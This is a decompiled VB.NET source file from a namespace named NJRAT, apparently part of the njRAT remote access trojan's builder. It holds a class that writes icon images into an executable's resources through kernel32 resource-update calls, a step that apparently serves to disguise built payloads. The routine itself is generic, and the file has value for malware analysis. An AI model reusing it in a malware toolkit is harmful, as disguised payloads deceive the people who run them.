Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security

Namespace NJRAT
	' Token: 0x02000029 RID: 41
	Public Class IconN
		' Token: 0x060003CA RID: 970 RVA: 0x000295FF File Offset: 0x000277FF
		Public Shared Sub InjectIcon(exeFileName As String, iconFileName As String)
			IconN.InjectIcon(exeFileName, iconFileName, 1UI, 1UI)
		End Sub

		' Token: 0x060003CB RID: 971 RVA: 0x0002960C File Offset: 0x0002780C
		Public Shared Sub InjectIcon(exeFileName As String, iconFileName As String, iconGroupID As UInteger, iconBaseID As UInteger)
			Dim iconFile As IconN.IconFile = IconN.IconFile.FromFile(iconFileName)
			Dim hUpdate As IntPtr = IconN.NativeMethods.BeginUpdateResource(exeFileName, False)
			Dim array As Byte() = iconFile.CreateIconGroupData(iconBaseID)
			IconN.NativeMethods.UpdateResource(hUpdate, New IntPtr(14L), New IntPtr(CLng(CULng(iconGroupID))), 0S, array, array.Length)
			Dim num As Integer = iconFile.ImageCount - 1
			For i As Integer = 0 To num
				Dim array2 As Byte() = iconFile.get_ImageData(i)
				IconN.NativeMethods.UpdateResource(hUpdate, New IntPtr(3L), New IntPtr(CLng((CULng(iconBaseID) + CULng(CLng(i))))), 0S, array2, array2.Length)
			Next
			IconN.NativeMethods.EndUpdateResource(hUpdate, False)
		End Sub

		' Token: 0x02000040 RID: 64
		<SuppressUnmanagedCodeSecurity()>
		Private Class NativeMethods
			' Token: 0x0600048B RID: 1163
			Public Declare Function BeginUpdateResource Lib "kernel32" (fileName As String, <MarshalAs(UnmanagedType.Bool)> deleteExistingResources As Boolean) As IntPtr

			' Token: 0x0600048C RID: 1164
			Public Declare Function UpdateResource Lib "kernel32" (hUpdate As IntPtr, type As IntPtr, name As IntPtr, language As Short, <MarshalAs(UnmanagedType.LPArray, SizeParamIndex := 5S)> data As Byte(), dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean

			' Token: 0x0600048D RID: 1165
			Public Declare Function EndUpdateResource Lib "kernel32" (hUpdate As IntPtr, <MarshalAs(UnmanagedType.Bool)> discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
		End Class

		' Token: 0x02000041 RID: 65
		Private Structure ICONDIR
			' Token: 0x040002AB RID: 683
			Public Reserved As UShort

			' Token: 0x040002AC RID: 684
			Public Type As UShort

			' Token: 0x040002AD RID: 685
			Public Count As UShort
		End Structure

		' Token: 0x02000042 RID: 66
		Private Structure ICONDIRENTRY
			' Token: 0x040002AE RID: 686
			Public Width As Byte

			' Token: 0x040002AF RID: 687
			Public Height As Byte

			' Token: 0x040002B0 RID: 688
			Public ColorCount As Byte

			' Token: 0x040002B1 RID: 689
			Public Reserved As Byte

			' Token: 0x040002B2 RID: 690
			Public Planes As UShort

			' Token: 0x040002B3 RID: 691
			Public BitCount As UShort

			' Token: 0x040002B4 RID: 692
			Public BytesInRes As Integer

			' Token: 0x040002B5 RID: 693
			Public ImageOffset As Integer
		End Structure

		' Token: 0x02000043 RID: 67
		Private Structure BITMAPINFOHEADER
			' Token: 0x040002B6 RID: 694
			Public Size As UInteger

			' Token: 0x040002B7 RID: 695
			Public Width As Integer

			' Token: 0x040002B8 RID: 696
			Public Height As Integer

			' Token: 0x040002B9 RID: 697
			Public Planes As UShort

			' Token: 0x040002BA RID: 698
			Public BitCount As UShort

			' Token: 0x040002BB RID: 699
			Public Compression As UInteger

			' Token: 0x040002BC RID: 700
			Public SizeImage As UInteger

			' Token: 0x040002BD RID: 701
			Public XPelsPerMeter As Integer

			' Token: 0x040002BE RID: 702
			Public YPelsPerMeter As Integer

			' Token: 0x040002BF RID: 703
			Public ClrUsed As UInteger

			' Token: 0x040002C0 RID: 704
			Public ClrImportant As UInteger
		End Structure

		' Token: 0x02000044 RID: 68
		<StructLayout(LayoutKind.Sequential, Pack := 2)>
		Private Structure GRPICONDIRENTRY
			' Token: 0x040002C1 RID: 705
			Public Width As Byte

			' Token: 0x040002C2 RID: 706
			Public Height As Byte

			' Token: 0x040002C3 RID: 707
			Public ColorCount As Byte

			' Token: 0x040002C4 RID: 708
			Public Reserved As Byte

			' Token: 0x040002C5 RID: 709
			Public Planes As UShort

			' Token: 0x040002C6 RID: 710
			Public BitCount As UShort

			' Token: 0x040002C7 RID: 711
			Public BytesInRes As Integer

			' Token: 0x040002C8 RID: 712
			Public ID As UShort
		End Structure

		' Token: 0x02000045 RID: 69
		Private Class IconFile
			' Token: 0x17000174 RID: 372
			' (get) Token: 0x0600048E RID: 1166 RVA: 0x0002DE04 File Offset: 0x0002C004
			Public ReadOnly Property ImageCount As Integer
				Get
					Return CInt(Me.iconDir.Count)
				End Get
			End Property

			' Token: 0x17000175 RID: 373
			' (get) Token: 0x0600048F RID: 1167 RVA: 0x0002DE24 File Offset: 0x0002C024
			Public ReadOnly Property ImageData(index As Integer) As Byte()
				Get
					Return Me.iconImage(index)
				End Get
			End Property

			' Token: 0x06000490 RID: 1168 RVA: 0x0002DE3E File Offset: 0x0002C03E
			Private Sub New()
				Me.iconDir = Nothing
			End Sub

			' Token: 0x06000491 RID: 1169 RVA: 0x0002DE54 File Offset: 0x0002C054
			Public Shared Function FromFile(filename As String) As IconN.IconFile
				Dim iconFile As IconN.IconFile = New IconN.IconFile()
				Dim array As Byte() = File.ReadAllBytes(filename)
				Dim gchandle As GCHandle = GCHandle.Alloc(array, GCHandleType.Pinned)
				iconFile.iconDir = CType(Marshal.PtrToStructure(gchandle.AddrOfPinnedObject(), GetType(IconN.ICONDIR)), IconN.ICONDIR)
				iconFile.iconEntry = New IconN.ICONDIRENTRY(CInt((iconFile.iconDir.Count - 1US + 1US)) - 1) {}
				iconFile.iconImage = New Byte(CInt((iconFile.iconDir.Count - 1US + 1US)) - 1)() {}
				Dim num As Integer = Marshal.SizeOf(iconFile.iconDir)
				Dim typeFromHandle As Type = GetType(IconN.ICONDIRENTRY)
				Dim num2 As Integer = Marshal.SizeOf(typeFromHandle)
				Dim num3 As Integer = CInt((iconFile.iconDir.Count - 1US))
				For i As Integer = 0 To num3
					Dim icondirentry As IconN.ICONDIRENTRY = CType(Marshal.PtrToStructure(New IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + CLng(num)), typeFromHandle), IconN.ICONDIRENTRY)
					iconFile.iconEntry(i) = icondirentry
					iconFile.iconImage(i) = New Byte(icondirentry.BytesInRes - 1 + 1 - 1) {}
					Buffer.BlockCopy(array, icondirentry.ImageOffset, iconFile.iconImage(i), 0, icondirentry.BytesInRes)
					num += num2
				Next
				gchandle.Free()
				Return iconFile
			End Function

			' Token: 0x06000492 RID: 1170 RVA: 0x0002DF98 File Offset: 0x0002C198
			Public Function CreateIconGroupData(iconBaseID As UInteger) As Byte()
				Dim num As Integer = Marshal.SizeOf(GetType(IconN.ICONDIR)) + Marshal.SizeOf(GetType(IconN.GRPICONDIRENTRY)) * Me.ImageCount
				Dim array As Byte() = New Byte(num - 1 + 1 - 1) {}
				Dim gchandle As GCHandle = GCHandle.Alloc(array, GCHandleType.Pinned)
				Marshal.StructureToPtr(Me.iconDir, gchandle.AddrOfPinnedObject(), False)
				Dim num2 As Integer = Marshal.SizeOf(Me.iconDir)
				Dim num3 As Integer = Me.ImageCount - 1
				For i As Integer = 0 To num3
					Dim grpicondirentry As IconN.GRPICONDIRENTRY = Nothing
					Dim bitmapinfoheader As IconN.BITMAPINFOHEADER = Nothing
					Dim gchandle2 As GCHandle = GCHandle.Alloc(bitmapinfoheader, GCHandleType.Pinned)
					Marshal.Copy(Me.get_ImageData(i), 0, gchandle2.AddrOfPinnedObject(), Marshal.SizeOf(GetType(IconN.BITMAPINFOHEADER)))
					gchandle2.Free()
					grpicondirentry.Width = Me.iconEntry(i).Width
					grpicondirentry.Height = Me.iconEntry(i).Height
					grpicondirentry.ColorCount = Me.iconEntry(i).ColorCount
					grpicondirentry.Reserved = Me.iconEntry(i).Reserved
					grpicondirentry.Planes = bitmapinfoheader.Planes
					grpicondirentry.BitCount = bitmapinfoheader.BitCount
					grpicondirentry.BytesInRes = Me.iconEntry(i).BytesInRes
					grpicondirentry.ID = CUShort((CULng(iconBaseID) + CULng(CLng(i))))
					Marshal.StructureToPtr(grpicondirentry, New IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + CLng(num2)), False)
					num2 += Marshal.SizeOf(GetType(IconN.GRPICONDIRENTRY))
				Next
				gchandle.Free()
				Return array
			End Function

			' Token: 0x040002C9 RID: 713
			Private iconDir As IconN.ICONDIR

			' Token: 0x040002CA RID: 714
			Private iconEntry As IconN.ICONDIRENTRY()

			' Token: 0x040002CB RID: 715
			Private iconImage As Byte()()
		End Class
	End Class
End Namespace
